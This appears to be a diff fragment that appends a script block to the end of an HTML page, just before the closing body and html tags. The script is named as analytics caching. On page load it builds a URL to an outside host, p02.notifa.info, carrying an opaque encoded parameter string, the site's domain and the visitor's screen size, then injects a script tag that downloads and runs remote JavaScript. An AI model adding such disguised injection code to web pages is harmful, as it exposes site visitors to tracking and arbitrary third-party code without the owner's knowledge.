+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXPuHs9iUpx9mh8MBjeN%2fsaiyqBojGNk39bbJhTSt5Q4bMJ9ZJm7hrcKqvYKkJRhCmot5Lxx5w7limcakeHRWKazSxvdqNfsNVT4g8hxT%2fwNYWNKcz52j%2bpnkKg2GlVh1KPjKk0rUFicDuFMFwGzYF1QobZFfwIrfptO97GKy%2bMtweBhm6ZGWMzQTSqmdcdTkP5oYO3Hcea0DhJLX23tnaHp0DwTBIMe459vWXrt0K62JWSklUqZsbl4hAvb9l0KtAJsfclGKesmVD8LK1oZyazPuh8DSW8bg2q69kPANGRHM1JOY9Acuel3BYoIC6cDsfsmnJgZ6TLbX00Or9f2D%2fhKTgqrpOud4RN%2fxTZFxzHAm1PHVZpRxfpkZ3TOqbebHRjD%2fBoVHRIa8gZx0HRt9sFs0LhWMbKtjwZC4bZ4w9U%2b8qn8f5iuKK8A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
